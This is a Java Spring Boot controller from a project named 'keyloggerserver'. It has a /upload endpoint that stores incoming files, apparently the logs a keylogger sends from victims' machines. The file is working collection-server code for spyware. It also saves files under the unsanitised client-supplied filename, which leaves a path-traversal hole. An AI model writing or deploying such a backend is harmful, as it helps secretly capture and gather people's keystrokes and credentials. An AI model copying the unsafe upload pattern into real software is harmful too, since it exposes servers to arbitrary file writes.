package com.example.keyloggerserver.controller;

import com.example.keyloggerserver.utils.Constants;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

@RestController
@Slf4j
public class FilesController {

    @GetMapping("/hello")
    public String hello() {
        return "Hello :) ";
    }

    @PostMapping("/upload")
    public ResponseEntity<?> fileUpload(@RequestParam("files") MultipartFile[] files) throws IOException {

        for (MultipartFile file : files) {
            File myFile = new File(Constants.FILES_UPLOAD_DIRECTORY + file.getOriginalFilename());
            boolean isFileCreated = myFile.createNewFile();
            log.trace("is {}, {} created: ", file.getOriginalFilename(), isFileCreated);
            FileOutputStream fos = new FileOutputStream(myFile);
            fos.write(file.getBytes());
            fos.close();
        }
        return new ResponseEntity<>("The File Uploaded Successfully :))", HttpStatus.OK);
    }
}

//    @PostMapping("/upload")
//    public ResponseEntity<?> uploadFile(@RequestParam("file") MultipartFile file) {
//
//
//        String message = "";
//        try {
////            storageService.save(file);
//
//            message = "Uploaded the file successfully: " + file.getOriginalFilename();
//            return ResponseEntity.status(HttpStatus.OK).body(message
////                    new ResponseMessage(message)
//            );
//        } catch (Exception e) {
//            message = "Could not upload the file: " + file.getOriginalFilename() + ". Error: " + e.getMessage();
//            return ResponseEntity.status(HttpStatus.EXPECTATION_FAILED).body(
//                    message
////                    new ResponseMessage(message)
//            );
//        }
//    }